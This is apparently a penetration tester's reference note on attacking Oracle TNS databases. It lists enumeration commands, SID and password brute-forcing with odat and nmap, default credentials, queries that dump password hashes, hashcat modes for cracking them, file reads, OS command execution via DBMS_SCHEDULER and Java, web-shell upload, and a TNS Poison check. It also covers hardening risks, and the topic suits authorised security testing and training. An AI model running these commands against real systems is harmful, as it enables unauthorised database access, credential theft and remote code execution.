# Oracle TNS

#Oracle #OracleTNS #OracleTransparentNetworkSubstrate #database

## What is Oracle TNS?
Oracle Transparent Network Substrate — the communication protocol for Oracle Database clients. Part of Oracle Net Services. Supports TCP/IP, IPv6, TLS. Default port **TCP 1521**.

- Listener configured by `tnsnames.ora` (client-side resolution) and `listener.ora` (server-side listener config)
- Both in `$ORACLE_HOME/network/admin/`
- Oracle SID (System Identifier) — unique name per database instance, **required** for connection
- PL/SQL Exclusion List (`PlsqlExclusionList`) — blacklist file in `$ORACLE_HOME/sqldeveloper/` to block PL/SQL package execution via the app server

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Database/odat.py\|odat.py]] | The Oracle attack swiss-army-knife — SID/password guessing, file read/write, OS command exec, privesc; works without a full Oracle client |
| [[Tools/Database/SQLplus\|sqlplus]] | Oracle's own CLI client (needs Instant Client) — interactive SQL/PL/SQL, connect `as sysdba` |
| [[Tools/Scanning/NMAP\|Nmap]] | `oracle-tns-version` / `oracle-sid-brute` NSE |
| [[Tools/Payloads & Shells/metasploit\|Metasploit]] | `tnslsnr_version`, `sid_enum`, `sid_brute` scanners |
| [[Tools/Auth/hashcat\|hashcat]] | Crack Oracle hashes (mode 3100 / 112 / 12300 by version) |

---

## Configuration Files

| File | Location | Purpose |
|---|---|---|
| `tnsnames.ora` | `$ORACLE_HOME/network/admin/` | Client-side: service name → network address resolution |
| `listener.ora` | `$ORACLE_HOME/network/admin/` | Server-side: listener config, services, ports |
| `sqlnet.ora` | `$ORACLE_HOME/network/admin/` | Network encryption, auth settings |
| `orapwd` | `$ORACLE_HOME/dbs/` | Password file for SYSDBA/SYSOPER auth |

### TNS Connection Settings

| Setting | Description |
|---|---|
| `DESCRIPTION` | Descriptor with name and connection type |
| `ADDRESS` | Hostname and port |
| `PROTOCOL` | Network protocol (TCP) |
| `PORT` | Port number |
| `CONNECT_DATA` | Service name, SID, protocol |
| `SERVICE_NAME` | Service name to connect to |
| `SID` | Database instance identifier |
| `SERVER` | `dedicated` or `shared` |
| `SECURITY` | SSL/TLS options |
| `VALIDATE_CERT` | Whether to validate SSL cert |
| `CONNECT_TIMEOUT` | Connection timeout in seconds |

---

## Enumeration

```bash
# Nmap Oracle scripts
nmap -p 1521 --script oracle-tns-version -sV <target>
nmap -p 1521 --script oracle-sid-brute <target>

# SID brute force with odat.py
./odat.py sidguesser -s <target>

# Full scan with odat.py
./odat.py all -s <target>
./odat.py all -s <target> -p 1521

# SID enum with MSF
use auxiliary/scanner/oracle/tnslsnr_version
use auxiliary/scanner/oracle/sid_enum
use auxiliary/scanner/oracle/sid_brute
```

---

## Connect / Access

```bash
# sqlplus (requires Oracle client)
sqlplus <user>/<pass>@<target>/<SID>
sqlplus scott/tiger@10.129.205.19/XE

# Connect as sysdba
sqlplus <user>/<pass>@<target>/<SID> as sysdba
sqlplus scott/tiger@10.129.205.19/XE as sysdba

# Connect to XDB (XML DB, often on 8080/8443)
sqlplus scott/tiger@10.129.205.19/XEXDB

# odat.py (Python, works without full Oracle client)
./odat.py all -s <target> -d <SID>
```

### Install odat.py

```bash
sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init && git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
pip3 install pycryptodome
```

---

## Key SQL Commands

```sql
-- Current user
SELECT user FROM dual;

-- All tables (DBA view)
SELECT owner, table_name FROM dba_tables;

-- All tables (accessible to current user)
SELECT owner, table_name FROM all_tables;

-- User tables only
SELECT table_name FROM user_tables;

-- List all users
SELECT username FROM dba_users;

-- Check current privileges
SELECT * FROM session_privs;

-- Password hashes (requires DBA / SELECT on sys.user$)
--   NOTE: dba_users.password has been NULL since Oracle 11g — the real hashes live in sys.user$:
--     password = legacy DES (Oracle "H:" type), spare4 = SHA1 (11g) + SHA512 (12c) salted
SELECT name, password, spare4 FROM sys.user$;

-- Check for DBA role
SELECT * FROM dba_role_privs WHERE granted_role = 'DBA';
```

---

## Attack Vectors

### Default Credentials to Try

| Username | Password | Notes |
|---|---|---|
| `scott` | `tiger` | Classic default Oracle credentials |
| `sys` | `change_on_install` | Default SYSDBA password |
| `system` | `manager` | Default SYSTEM password |
| `dbsnmp` | `dbsnmp` | SNMP agent account |

### Brute Force SID + Credentials

```bash
# SID brute force
./odat.py sidguesser -s <target>
nmap -p 1521 --script oracle-sid-brute <target>

# Credential brute force once SID found
./odat.py passwordguesser -s <target> -d <SID>
./odat.py passwordguesser -s <target> -d <SID> --accounts-file accounts.txt
```

### Read Files

```bash
# odat.py utlfile module
./odat.py utlfile -s <target> -d <SID> -U <user> -P <pass> --getFile /etc/passwd /tmp/ passwd
```

```sql
-- UTL_FILE package (requires directory object)
SELECT UTL_FILE.FGETATTR('DIR_NAME', 'filename') FROM dual;
```

### OS Command Execution (DBMS_SCHEDULER) + File Upload

```bash
# OS command execution via the DBMS_SCHEDULER job trick
./odat.py dbmsscheduler -s <target> -d <SID> -U <user> -P <pass> --exec "cmd.exe /c whoami"

# Upload a web shell (or any file) to a writable path via UTL_FILE
./odat.py utlfile -s <target> -d <SID> -U <user> -P <pass> --putFile /var/www/html shell.php shell.php
```

### OS Commands via Java (as SYSDBA)

```sql
-- Execute OS commands using Java (if Java installed)
EXEC dbms_java.grant_permission('USERNAME','SYS:java.io.FilePermission','<<ALL FILES>>','execute');

SELECT DBMS_JAVA_TEST.FUNCALL('/bin/bash','-c','id > /tmp/out') FROM dual;
```

### Crack Password Hashes

Oracle's hash format depends on version — pick the matching hashcat mode:

```bash
hashcat -m 3100  oracle_h.txt   rockyou.txt   # "H:" type — legacy DES (Oracle 7–10g, sys.user$.password)
hashcat -m 112   oracle_s.txt   rockyou.txt   # "S:" type — SHA1 salted (Oracle 11g, first 60 chars of spare4)
hashcat -m 12300 oracle_t.txt   rockyou.txt   # "T:" type — PBKDF2-SHA512 (Oracle 12c+, spare4)
```

> [!note] The `spare4` value packs multiple hashes prefixed `S:`, `H:`, `T:`. Split out the type you want: the `S:` portion → `-m 112`, the `T:` portion → `-m 12300`. Only very old databases still expose the crackable-fast `H:` DES form.

### TNS Listener Poisoning — CVE-2012-1675 ("TNS Poison")

On unpatched/misconfigured listeners that allow **remote registration**, an attacker can register a second, rogue database instance with the *same* service name as a legitimate one. The listener then load-balances client connections to the attacker's instance, enabling a **man-in-the-middle** on all new sessions (credential capture, query interception).

```bash
# Check whether the listener accepts remote registration (the precondition)
./odat.py tnscmd -s <target> --status
# Mitigation is COST (Class of Secure Transport) / valid-node-checking / dynamic-registration off —
# absence of these on an old 10g/11g listener = exploitable.
```

> [!warning] Oracle's fix (COST restrictions) shipped in 2012 but requires manual `listener.ora` hardening; legacy 10g/11g listeners are frequently still vulnerable. Confirm the listener version (`nmap --script oracle-tns-version`) and registration behaviour before relying on it.

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Listener allows remote registration (no COST/valid-node-checking) | CVE-2012-1675 TNS Poison — MITM all new sessions |
| Default credentials (`scott/tiger`, `system/manager`, `sys/change_on_install`) | Trivial authenticated access |
| No `PlsqlExclusionList` / permissive PL/SQL packages | UTL_FILE read/write, DBMS_SCHEDULER OS exec |
| `UTL_FILE_DIR` set / broad directory objects | Arbitrary file read/write off the DB host |
| `dbms_java` granted to non-DBA | Java-based OS command execution |
| Weak account with `CREATE SESSION` + `EXECUTE` on privileged packages | Privesc via PL/SQL |
| Old listener version (10g/11g, unpatched) | TNS Poison and known listener CVEs |

---

## Quick Reference

| Goal | Command |
|---|---|
| Connect | `sqlplus user/pass@host/SID` |
| Connect as sysdba | `sqlplus user/pass@host/SID as sysdba` |
| Full odat.py scan | `./odat.py all -s host -d SID` |
| SID brute force | `./odat.py sidguesser -s host` |
| All tables | `SELECT owner,table_name FROM all_tables;` |
| All users | `SELECT username FROM dba_users;` |
| Password hashes | `SELECT name,password,spare4 FROM sys.user$;` (not `dba_users` — NULL since 11g) |
| Crack 11g hash | `hashcat -m 112 hashes.txt rockyou.txt` |
| OS command (odat) | `./odat.py dbmsscheduler -s host -d SID -U user -P pass --exec "id"` |
| TNS Poison check | `./odat.py tnscmd -s host --status` |
| Nmap SID enum | `nmap -p 1521 --script oracle-sid-brute host` |

---

> [!note] **See also** — Oracle attack tooling: [[Tools/Database/odat.py|odat.py]] (the workhorse) and [[Tools/Database/SQLplus|sqlplus]]. Sibling relational DBs: [[Services/Database Services/MSSQL|MSSQL]], [[Services/Database Services/PostgreSQL|PostgreSQL]].

---

*Created: 2026-07-13*
*Updated: 2026-09-22*
*Model: claude-opus-4-8*
